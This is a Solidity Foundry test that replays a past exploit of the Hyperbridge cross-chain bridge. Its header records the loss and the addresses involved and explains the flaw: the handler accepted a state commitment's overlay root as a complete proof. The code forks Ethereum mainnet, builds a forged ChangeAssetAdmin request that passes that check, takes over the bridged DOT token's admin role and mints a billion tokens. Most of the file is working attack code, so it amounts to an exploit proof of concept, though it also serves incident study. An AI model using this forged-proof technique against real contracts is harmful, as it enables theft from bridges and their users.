// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$2.5M
    - Attacker: https://etherscan.io/address/0xc513e4f5d7a93a1dd5b7c4d9f6cc2f52d2f1f8e7
    - Attack Contract: https://etherscan.io/address/0x31a165a956842ab783098641db25c7a9067ca9ab
    - Vulnerable Contract: https://etherscan.io/address/0x6C84eDd2A018b1fe2Fc93a56066B5C60dA4E6D64
    - Attack Tx: https://etherscan.io/tx/0x240aeb9a8b2aabf64ed8e1e480d3e7be140cf530dc1e5606cb16671029401109
    - Analysis: https://anomly.rs/hyperbridge-forged-postrequest

    HandlerV1 accepted the state commitment's overlay root as the complete
    multiproof for a one-leaf message. A forged ChangeAssetAdmin request could
    therefore seize the bridged DOT token's admin role and mint arbitrary supply.
*/

struct StateMachineHeight {
    uint256 stateMachineId;
    uint256 height;
}

struct StateCommitment {
    uint256 timestamp;
    bytes32 overlayRoot;
    bytes32 stateRoot;
}

struct PostRequest {
    bytes source;
    bytes dest;
    uint64 nonce;
    bytes from;
    bytes to;
    uint64 timeoutTimestamp;
    bytes body;
}

struct PostRequestLeaf {
    PostRequest request;
    uint256 index;
    uint256 kIndex;
}

struct Proof {
    StateMachineHeight height;
    bytes32[] multiproof;
    uint256 leafCount;
}

struct PostRequestMessage {
    Proof proof;
    PostRequestLeaf[] requests;
}

struct ChangeAssetAdmin {
    bytes32 assetId;
    address newAdmin;
}

interface IHyperbridgeHost {
    function host() external view returns (bytes memory);
    function hyperbridge() external view returns (bytes memory);
    function requestReceipts(
        bytes32 commitment
    ) external view returns (address);
}

interface IHyperbridgeHandler {
    function handlePostRequests(
        IHyperbridgeHost host,
        PostRequestMessage calldata request
    ) external;
}

interface IHyperbridgeGateway {
    function erc6160(
        bytes32 assetId
    ) external view returns (address);
}

interface IERC6160Token {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function mint(
        address to,
        uint256 amount
    ) external;
}

contract HyperbridgeExploitTest is Test {
    uint256 private constant FORK_BLOCK = 24_868_294;

    address private constant HANDLER = 0x6C84eDd2A018b1fe2Fc93a56066B5C60dA4E6D64;
    address private constant HOST_ADDRESS = 0x792A6236AF69787C40cF76b69B4c8c7B28c4cA20;
    address private constant TOKEN_GATEWAY = 0xFd413e3AFe560182C4471F4d143A96d3e259B6dE;
    address private constant DOT_ADDRESS = 0x8d010bf9C26881788b4e6bf5Fd1bdC358c8F90b8;

    bytes32 private constant DOT_ASSET_ID = 0x9bd00430e53a5999c7c603cfc04cbdaf68bdbc180f300e4a2067937f57a0534f;
    bytes32 private constant OVERLAY_ROOT = 0x466dddba7e9a84a0f2632b59be71b8bd489e3334a1314a61253f8b827c9d3a36;
    uint256 private constant MINT_AMOUNT = 1_000_000_000 ether;

    IHyperbridgeHost private constant HOST = IHyperbridgeHost(HOST_ADDRESS);
    IHyperbridgeHandler private constant BRIDGE_HANDLER = IHyperbridgeHandler(HANDLER);
    IERC6160Token private constant DOT = IERC6160Token(DOT_ADDRESS);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        vm.label(HANDLER, "Hyperbridge HandlerV1");
        vm.label(HOST_ADDRESS, "Hyperbridge EthereumHost");
        vm.label(TOKEN_GATEWAY, "Hyperbridge TokenGateway");
        vm.label(DOT_ADDRESS, "Hyperbridge DOT");
    }

    function testExploit() public {
        assertEq(IHyperbridgeGateway(TOKEN_GATEWAY).erc6160(DOT_ASSET_ID), DOT_ADDRESS);

        (bool mintAllowedBefore,) = DOT_ADDRESS.call(abi.encodeCall(IERC6160Token.mint, (address(this), 1 ether)));
        assertFalse(mintAllowedBefore, "attacker was already token admin");

        (PostRequestMessage memory forgedMessage, bytes32 commitment) = _buildForgedMessage();
        assertEq(HOST.requestReceipts(commitment), address(0));

        uint256 supplyBefore = DOT.totalSupply();
        BRIDGE_HANDLER.handlePostRequests(HOST, forgedMessage);
        assertEq(HOST.requestReceipts(commitment), address(this));

        DOT.mint(address(this), MINT_AMOUNT);

        emit log_named_decimal_uint("forged DOT minted", DOT.balanceOf(address(this)), 18);
        assertEq(DOT.balanceOf(address(this)), MINT_AMOUNT);
        assertEq(DOT.totalSupply() - supplyBefore, MINT_AMOUNT);
    }

    function _buildForgedMessage() private view returns (PostRequestMessage memory message, bytes32 requestCommitment) {
        bytes memory body =
            bytes.concat(hex"04", abi.encode(ChangeAssetAdmin({assetId: DOT_ASSET_ID, newAdmin: address(this)})));

        PostRequest memory request = PostRequest({
            source: HOST.hyperbridge(),
            dest: HOST.host(),
            nonce: 3,
            from: abi.encodePacked(address(this)),
            to: abi.encodePacked(TOKEN_GATEWAY),
            timeoutTimestamp: 0,
            body: body
        });

        requestCommitment = keccak256(
            abi.encodePacked(
                request.source,
                request.dest,
                request.nonce,
                request.timeoutTimestamp,
                request.from,
                request.to,
                request.body
            )
        );

        bytes32[] memory multiproof = new bytes32[](1);
        multiproof[0] = OVERLAY_ROOT;

        PostRequestLeaf[] memory requests = new PostRequestLeaf[](1);
        requests[0] = PostRequestLeaf({request: request, index: 1, kIndex: 0});

        message = PostRequestMessage({
            proof: Proof({
                height: StateMachineHeight({stateMachineId: 3367, height: 9_775_932}),
                multiproof: multiproof,
                leafCount: 1
            }),
            requests: requests
        });
    }
}
